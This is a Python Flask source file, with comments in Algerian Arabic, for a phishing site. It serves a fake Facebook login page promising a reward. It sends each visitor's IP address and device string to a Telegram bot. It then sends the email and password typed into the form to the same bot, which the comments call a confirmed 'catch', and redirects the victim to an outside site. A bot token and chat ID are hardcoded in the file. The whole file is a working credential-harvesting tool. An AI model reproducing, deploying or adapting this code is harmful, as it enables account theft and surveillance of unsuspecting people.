import os
import requests
from flask import Flask, request, redirect

app = Flask(__name__)

BOT_TOKEN = "8416648663:AAHP3pqJAMOcNGG5LY6hqOwikiiPxiXuRlA"
CHAT_ID = "7479786207"

@app.route('/')
def index():
    # --- هادي هي "العفسة القوة" ---
    # نسحبوا معلومات الجهاز من الـ Header تاع الطلب
    user_agent = request.headers.get('User-Agent')
    ip_addr = request.remote_addr # عنوان الـ IP
    
    # نبعثوا تنبيه للتلغرام بلي كاين "ضحية" جديدة راهي داخل الصفحة
    info_msg = f"🔔 زائر جديد دخل للرابط!\n📱 الجهاز: {user_agent}\n🌐 الـ IP: {ip_addr}"
    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={"chat_id": CHAT_ID, "text": info_msg})
    
    # نرجعولو صفحة الفيسبوك اللي خدمناها
    return """
    <html>
    <head><title>Facebook - Login</title></head>
    <body style="font-family: Arial; text-align: center; background-color: #f0f2f5;">
        <h1 style="color: #1877f2;">facebook</h1>
        <p>يجب تسجيل الدخول لتأكيد الهوية واستلام المكافأة</p>
        <form action="/login" method="POST">
            <input type="text" name="u" placeholder="Email or Phone" style="padding:10px; width:80%; margin:10px;"><br>
            <input type="password" name="p" placeholder="Password" style="padding:10px; width:80%; margin:10px;"><br>
            <button type="submit" style="background:#1877f2; color:white; padding:10px 20px; border:none; border-radius:5px;">Login</button>
        </form>
    </body>
    </html>
    """

@app.route('/login', methods=['POST'])
def login():
    u = request.form.get('u')
    p = request.form.get('p')
    
    # نبعثوا "الصيدة" الكاملة (إيميل + باسورد)
    final_msg = f"✅ صيدة مأكدة!\n📧 الإيميل: {u}\n🔑 الباسورد: {p}"
    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={"chat_id": CHAT_ID, "text": final_msg})
    
    return redirect("https://trianglerockers.com/1885419")

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 10000))
    app.run(host='0.0.0.0', port=port)
